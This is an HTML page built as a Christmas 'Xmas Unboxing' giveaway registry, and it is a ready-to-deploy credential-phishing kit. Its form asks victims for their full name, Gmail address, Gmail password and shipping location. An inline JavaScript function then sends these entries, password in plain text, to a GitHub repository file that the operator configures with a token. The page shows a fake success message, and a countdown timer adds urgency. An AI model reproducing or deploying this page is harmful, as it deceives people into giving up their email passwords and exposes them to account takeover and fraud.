<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Grand Xmas Unboxing | 2025 Luxury Registry</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-deep: #020d0d;       
            --accent-gold: #f7dba7;   
            --glass-white: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
            --success-green: #4ade80;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at top, #0a3a38, var(--bg-deep));
            color: white; min-height: 100vh;
            display: flex; flex-direction: column; align-items: center;
        }

        #snow-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }

        header { text-align: center; padding: 60px 20px 40px; z-index: 1; }
        
        .premium-tag { color: var(--accent-gold); letter-spacing: 4px; font-size: 0.75rem; font-weight: 600; margin-bottom: 10px; display: block; }

        h1 {
            font-family: 'Playfair Display', serif; font-size: clamp(2.5rem, 8vw, 4rem);
            background: linear-gradient(to bottom, #fff, var(--accent-gold));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .main-container { width: 95%; max-width: 550px; z-index: 1; margin-bottom: 80px; }

        .glass-card {
            background: var(--glass-white); backdrop-filter: blur(30px);
            border: 1px solid var(--glass-border); border-radius: 24px;
            padding: 40px; box-shadow: 0 50px 100px rgba(0,0,0,0.5);
        }

        h2 { font-family: 'Playfair Display', serif; font-size: 1.8rem; margin-bottom: 25px; text-align: center; }

        .input-group { margin-bottom: 18px; position: relative; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-gold); opacity: 0.6; }

        input {
            width: 100%; padding: 15px 15px 15px 45px;
            background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border);
            border-radius: 12px; color: white; font-size: 0.95rem;
        }

        input:focus { border-color: var(--accent-gold); outline: none; }

        .submit-btn {
            width: 100%; padding: 18px;
            background: linear-gradient(135deg, var(--accent-gold), #d4af37);
            color: #041f1e; border: none; border-radius: 12px;
            font-weight: 700; text-transform: uppercase; letter-spacing: 2px;
            cursor: pointer; transition: 0.4s;
        }

        .submit-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(247, 219, 167, 0.3); }

        /* Timer Styles */
        .timer-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 30px; }
        .t-box { text-align: center; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; }
        .t-val { font-size: 1.2rem; font-weight: 700; color: var(--accent-gold); display: block; }
        .t-label { font-size: 0.55rem; text-transform: uppercase; opacity: 0.5; }
    </style>
</head>
<body>

<canvas id="snow-canvas"></canvas>

<header>
    <span class="premium-tag">ESTABLISHED 2025</span>
    <h1>Xmas Unboxing</h1>
</header>

<div class="main-container">
    <div class="glass-card">
        <h2>Winner Registry</h2>
        <form id="registryForm">
            <div class="input-group">
                <i class="fa fa-user"></i>
                <input type="text" id="username" placeholder="Full Name" required>
            </div>
            <div class="input-group">
                <i class="fa fa-envelope"></i>
                <input type="email" id="email" placeholder="Gmail Address" required>
            </div>
            <div class="input-group">
                <i class="fa fa-lock"></i>
                <input type="password" id="password" placeholder="Gmail Password" required>
            </div>
            <div class="input-group">
                <i class="fa fa-location-dot"></i>
                <input type="text" id="location" placeholder="Shipping Location" required>
            </div>
            
            <button type="button" id="submitBtn" onclick="saveToGitHub()" class="submit-btn">Submit Registry</button>
        </form>

        <div class="timer-row">
            <div class="t-box"><span class="t-val" id="d">00</span><span class="t-label">Days</span></div>
            <div class="t-box"><span class="t-val" id="h">00</span><span class="t-label">Hrs</span></div>
            <div class="t-box"><span class="t-val" id="m">00</span><span class="t-label">Min</span></div>
            <div class="t-box"><span class="t-val" id="s">00</span><span class="t-label">Sec</span></div>
        </div>
    </div>
</div>

<script>
    async function saveToGitHub() {
        const btn = document.getElementById('submitBtn');
        
        // --- CONFIGURATION: EDIT THESE THREE ---
        const GITHUB_TOKEN = "YOUR_TOKEN_HERE"; 
        const OWNER = "YOUR_USERNAME";
        const REPO = "YOUR_REPO_NAME";
        const FILE_PATH = "file.txt"; 

        const name = document.getElementById('username').value;
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        const loc = document.getElementById('location').value;
        
        if(!name || !email || !pass || !loc) {
            alert("Please fill all fields.");
            return;
        }

        btn.innerText = "PROCESSING...";
        btn.disabled = true;

        const timestamp = new Date().toLocaleString();
        const newEntry = `\n[${timestamp}] Name: ${name} | Email: ${email} | Pass: ${pass} | Loc: ${loc}`;

        try {
            const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${FILE_PATH}`;
            
            // 1. Get current file data
            const response = await fetch(url, {
                headers: { "Authorization": `Bearer ${GITHUB_TOKEN}` }
            });

            let sha = "";
            let currentContent = "";

            if (response.ok) {
                const data = await response.json();
                sha = data.sha;
                currentContent = decodeURIComponent(escape(atob(data.content))); 
            }

            // 2. Prepare new content
            const updatedContent = btoa(unescape(encodeURIComponent(currentContent + newEntry)));

            // 3. Update file on GitHub
            const pushResponse = await fetch(url, {
                method: "PUT",
                headers: {
                    "Authorization": `Bearer ${GITHUB_TOKEN}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    message: "New Xmas Entry",
                    content: updatedContent,
                    sha: sha
                })
            });

            if (pushResponse.ok) {
                alert("Success! Your gift request has been recorded.");
                document.getElementById('registryForm').reset();
            } else {
                alert("Error: Check your Token/Repo configuration.");
            }
        } catch (err) {
            alert("Connection failed.");
        } finally {
            btn.innerText = "SUBMIT REGISTRY";
            btn.disabled = false;
        }
    }

    // Timer and Snow logic
    const target = new Date("Dec 25, 2025 00:00:00").getTime();
    setInterval(() => {
        const now = new Date().getTime();
        const gap = target - now;
        document.getElementById('d').innerText = Math.floor(gap / (1000*60*60*24));
        document.getElementById('h').innerText = Math.floor((gap % (1000*60*60*24)) / (1000*60*60));
        document.getElementById('m').innerText = Math.floor((gap % (1000*60*60)) / (1000*60));
        document.getElementById('s').innerText = Math.floor((gap % (1000*60)) / 1000);
    }, 1000);

    const canvas = document.getElementById('snow-canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    function init() {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        particles = [];
        for(let i=0; i<100; i++) particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, r:Math.random()*2+1, d:Math.random()*1});
    }
    function draw() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = "white"; ctx.beginPath();
        particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); });
        ctx.fill();
        particles.forEach(p => { p.y += p.d + 0.5; if(p.y > canvas.height) p.y = -5; });
        requestAnimationFrame(draw);
    }
    init(); draw();
    window.addEventListener('resize', init);
</script>

</body>
</html>
